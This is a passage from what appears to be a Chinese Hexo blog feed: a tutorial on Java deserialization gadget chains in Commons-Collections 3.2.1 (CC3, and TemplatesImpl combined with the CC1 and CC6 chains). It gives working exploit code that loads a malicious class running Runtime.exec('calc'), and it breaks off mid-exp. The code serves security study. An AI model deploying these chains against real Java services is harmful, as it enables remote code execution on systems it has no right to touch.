class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exp2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>        setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>        setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>        setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br>        ChainedTransformer&lt;Object&gt; chainedTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;(transformers);<br><br>        <span class="hljs-comment">// 传入一个没有用的transformers</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>&lt;&gt;(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>&lt;&gt;());<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br><br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">// add后修改回去</span><br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TransformingComparator</span>&gt; transformingComparatorClass = transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformingComparatorClassDeclaredField</span> <span class="hljs-operator">=</span> transformingComparatorClass.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformingComparatorClassDeclaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformingComparatorClassDeclaredField.set(transformingComparator, chainedTransformer);<br>        SerializeUtil.serialize(priorityQueue);<br>        SerializeUtil.unSerialize();<br>    &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cc3调用链</title>
    <link href="/2024/05/28/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/cc%E9%93%BE/cc3%E8%B0%83%E7%94%A8%E9%93%BE/"/>
    <url>/2024/05/28/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/cc%E9%93%BE/cc3%E8%B0%83%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h1><ul><li>jdk8u65</li><li>Commons-Collections 3.2.1</li></ul><p>导入maven坐标：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="TemplatesImpl解析："><a href="#TemplatesImpl解析：" class="headerlink" title="TemplatesImpl解析："></a>TemplatesImpl解析：</h1><p>在之前写的java中类加载器的过程中，有使用到<code>TemplatesImpl</code>这个类的<code>ClassLoader</code>方法，调用了<code>ClassLoader</code>的<code>defineClass</code>方法，并且是public，相当于我们可以间接调用。</p><p>由于这个<code>_class</code>强转成了<code>AbstractTranslet</code>，因此传入的字节码应该是要继承<code>AbstractTranslet</code>的。</p><p><img src="E:\blog\source\blog_image\image-20240330152022791-1716862451267-225.png" alt="image-20240330152022791"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    templates.newTransformer();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(TemplatesImpl templates, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> templates.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(templates, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>回顾完<code>TemplatesImpl </code>正式进去cc3学习。</p><p>一般字节码解析的过程是这样的。</p><p><img src="E:\blog\source\blog_image\image-20240330152321046-1716862451268-226.png" alt="image-20240330152321046"></p><p>首先调用<code>loadClass()</code>，分别调用父类的<code>loadClass</code>看是否存在该类的解析器(双亲委派机制)，如果找不到则会调用<code>findClass</code>。</p><p>对于<code>findClass</code>方法：</p><ul><li>需要子类去实现该方法</li><li>根据提供的路径或名称去加载<code>.class</code>字节码，最终调用<code>defineClass</code></li></ul><p><img src="E:\blog\source\blog_image\image-20240330152747502-1716862451268-227.png" alt="image-20240330152747502"></p><h1 id="TemplatesImpl结合cc1链："><a href="#TemplatesImpl结合cc1链：" class="headerlink" title="TemplatesImpl结合cc1链："></a>TemplatesImpl结合cc1链：</h1><p>前面的链子一样，但是不调用<code>Runtime</code>类，而是调用自定义的<code>class</code>字节码，然后加载类。</p><p><img src="E:\blog\source\blog_image\image-20240330153205393-1716862451268-228.png" alt="image-20240330153205393"></p><p>换成<code>ChainedTransformer</code>调用<code>newTransformer</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    <span class="hljs-comment">// defineClass只是加载类，但不会进行实例化</span><br>    Transformer[] transformers = &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>            <span class="hljs-comment">// 然后调用它的newTransformer()方法</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    chainedTransformer.transform(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(TemplatesImpl templates, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> templates.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(templates, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们把cc1的<code>LazyMap</code>的那条链丢进去，进行序列化即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    <span class="hljs-comment">// defineClass只是加载类，但不会进行实例化</span><br>    Transformer[] transformers = &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>            <span class="hljs-comment">// 然后调用它的newTransformer()方法</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>    Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>    <span class="hljs-comment">// 传入一个动态代理对象，就会调用这个动态代理对象的get方法 --&gt; 这个动态代理对象是我们上面的lazymap</span><br>    Constructor&lt;?&gt; aClassDeclaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<br>    aClassDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) aClassDeclaredConstructor.newInstance(Override.class, decorateMap);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br><br>    <span class="hljs-comment">// 创建对象</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">aObejct</span> <span class="hljs-operator">=</span> aClassDeclaredConstructor.newInstance(Target.class, proxyMap);<br>    <span class="hljs-comment">// 执行反序列化</span><br>    SerializeUtil.serialize(aObejct);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(TemplatesImpl templates, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> templates.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(templates, value);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="TemplatesImpl结合cc6链："><a href="#TemplatesImpl结合cc6链：" class="headerlink" title="TemplatesImpl结合cc6链："></a>TemplatesImpl结合cc6链：</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>    Transformer[] transformers = &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>            <span class="hljs-comment">// 然后调用它的newTransformer()方法</span><br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;)<br>    &#125;;<br>    <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>    <span class="hljs-comment">// 调用TideMap</span><br>    HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-comment">// 这里随便传入一个数据</span><br>    <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;asd&quot;</span>));<br><br>    HashMap&lt;Object, Object&gt; expHashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;key&quot;</span>);<br><br>    <span class="hljs-comment">// 这里才是执行完整的链路 就会根据key调用hash--&gt;hashCode--&gt;getValue</span><br>    expHashMap.put(tiedMapEntry, <span class="hljs-number">0</span>);<br><br>    lazyMap.remove(<span class="hljs-string">&quot;key&quot;</span>);<br><br>    <span class="hljs-comment">// 这里可以理解为序列化结束了 我们修改这个LazyMap的值 反序列化的时候会调用</span><br>    Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>    <span class="hljs-comment">// 修改字段的值</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-comment">// 修改成原本的factory</span><br>    factoryFiled.set(lazyMap,factory);<br><br>    <span class="hljs-comment">// 序列化</span><br>    SerializeUtil.serialize(expHashMap);<br>    SerializeUtil.unSerialize();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(TemplatesImpl templates, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> templates.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(templates, value);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="正经，原味cc3："><a href="#正经，原味cc3：" class="headerlink" title="正经，原味cc3："></a>正经，原味cc3：</h1><p>查看<code>newTransformer</code>方法，谁调用了发现好几个</p><p><img src="E:\blog\source\blog_image\image-20240330162735851-1716862451268-229.png" alt="image-20240330162735851"></p><p>存在几个类调用这个<code>newTransformer</code>方法，但是我们主要用<code>TrAXFilter</code></p><blockquote><p>Process：在_main中，一般不会调用吧。</p><p>getOutProperties：是反射调用的方法，可能在fastjson漏洞里面会调用到。</p><p>TransformerFactoryImpl ：这个没有点搞头，因为它不能序列化，构造函数传参有点难。</p><p>TrAXFilter：也是不能序列化的。但是构造函数传参容易。</p></blockquote><p>这调用了<code>Templates</code>形参的<code>newTransformer</code>，其他的都是静态成员的值。</p><p><img src="E:\blog\source\blog_image\image-20240330163758508-1716862451268-230.png" alt="image-20240330163758508"></p><p>CC3调用链不再依赖<code>InvokerTransformer</code>，而是换了一个类<code>InstantiateTransformer</code></p><p>这个类是可以序列化的：</p><p><img src="E:\blog\source\blog_image\image-20240330164320127-1716862451268-231.png" alt="image-20240330164320127"></p><p>查看<code>transform</code>方法，主要逻辑判断传入是否是<code>Class</code>类型，如果是的是则调用该<code>Class</code>的构造方法，并且创建了一个实例。</p><p><img src="E:\blog\source\blog_image\image-20240330164424946-1716862451268-232.png" alt="image-20240330164424946"></p><p>所以我们的思路是使用这个调用<code>InstantiateTransformer</code>的构造函数，形参传入的是<code>Templates</code>，就会调用<code>newTransformer</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>    <span class="hljs-comment">// 调用TrAXFilter的构造方法 传入templates 就会调用templates.newTransformer</span><br>    <span class="hljs-comment">// 相当于</span><br>    <span class="hljs-comment">// Class&lt;TrAXFilter&gt; trAXFilterClass = TrAXFilter.class;</span><br>    <span class="hljs-comment">// Constructor&lt;TrAXFilter&gt; constructor =trAXFilterClass.getConstructor(Templates.class);</span><br>    <span class="hljs-comment">// TrAXFilter trAXFilter = constructor.newInstance(templates);</span><br>    <span class="hljs-comment">// iParamTypes 就是 Templates.class</span><br>    <span class="hljs-comment">// iArgs 就是 templates</span><br>    <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>    instantiateTransformer.transform(TrAXFilter.class);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(TemplatesImpl templates, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> templates.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(templates, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>后续就很简单的，调用<code>transform</code>方法，因此使用cc1后半段的链即可。</p><p>完整exp如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 